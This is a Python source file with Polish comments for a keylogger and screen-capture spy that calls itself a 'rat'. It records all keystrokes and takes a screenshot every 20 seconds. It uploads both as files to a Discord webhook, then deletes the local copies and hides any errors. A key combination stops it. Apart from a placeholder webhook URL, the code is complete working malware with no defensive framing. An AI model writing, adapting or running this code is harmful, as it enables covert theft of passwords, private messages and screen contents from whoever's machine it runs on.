import pyautogui
import requests
import time
import os
import threading
import sys
import tkinter as tk
from tkinter import messagebox
from datetime import datetime
from pynput import keyboard

# Konfiguracja
DISCORD_WEBHOOK_URL = "your webhook"
INTERVAL = 20
IDLE_THRESHOLD = 4

# Zmienne globalne
keystrokes = ""
last_press_time = time.time()
lock = threading.Lock()
running = True

# Kombinacja klawiszy do wyłączenia (Page Up + Page Down)
EXIT_KEYS = {keyboard.Key.page_up, keyboard.Key.page_down}
current_keys = set()

def show_exit_message():
    # Tworzy ukryte okno główne tkinter, aby wyświetlić sam komunikat
    root = tk.Tk()
    root.withdraw()
    root.attributes("-topmost", True)
    messagebox.showinfo("Status", "szczur wylaczony")
    root.destroy()

def on_press(key):
    global keystrokes, last_press_time, current_keys, running
    
    # Obsługa kombinacji wyjścia
    if key in EXIT_KEYS:
        current_keys.add(key)
        if all(k in current_keys for k in EXIT_KEYS):
            running = False
            return False

    current_time = time.time()
    with lock:
        if current_time - last_press_time > IDLE_THRESHOLD and keystrokes != "":
            if not keystrokes.endswith("\n"):
                keystrokes += "\n"
        
        try:
            keystrokes += key.char
        except AttributeError:
            if key == keyboard.Key.space:
                keystrokes += " "
            elif key == keyboard.Key.enter:
                keystrokes += "\n"
            elif key == keyboard.Key.backspace:
                if len(keystrokes) > 0 and keystrokes[-1] != "\n":
                    keystrokes = keystrokes[:-1]
            
        last_press_time = current_time

def on_release(key):
    if key in current_keys:
        current_keys.remove(key)

def send_data():
    global keystrokes
    screenshot_name = "screenshot.png"
    log_name = "logs.txt"
    
    try:
        screenshot = pyautogui.screenshot()
        screenshot.save(screenshot_name)
        
        with lock:
            current_logs = keystrokes
            keystrokes = "" 
            
        with open(log_name, "w", encoding="utf-8") as f:
            f.write(current_logs if current_logs else "Brak nowej aktywności.")

        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        payload = {"content": f"🤫 **Raport:** `{timestamp}`"}
        
        with open(screenshot_name, "rb") as ss, open(log_name, "rb") as lg:
            files = {
                "file1": (screenshot_name, ss, "image/png"),
                "file2": (log_name, lg, "text/plain")
            }
            requests.post(DISCORD_WEBHOOK_URL, data=payload, files=files)

    except Exception:
        pass
    
    finally:
        if os.path.exists(screenshot_name): os.remove(screenshot_name)
        if os.path.exists(log_name): os.remove(log_name)

def main():
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    
    while running:
        # Sprawdzanie warunku co sekundę, aby szybciej zareagować na zamknięcie
        for _ in range(INTERVAL):
            if not running: break
            time.sleep(1)
        
        if running:
            send_data()
    
    # Po wyjściu z pętli pokaż komunikat
    show_exit_message()
    sys.exit()

if __name__ == "__main__":

    main()
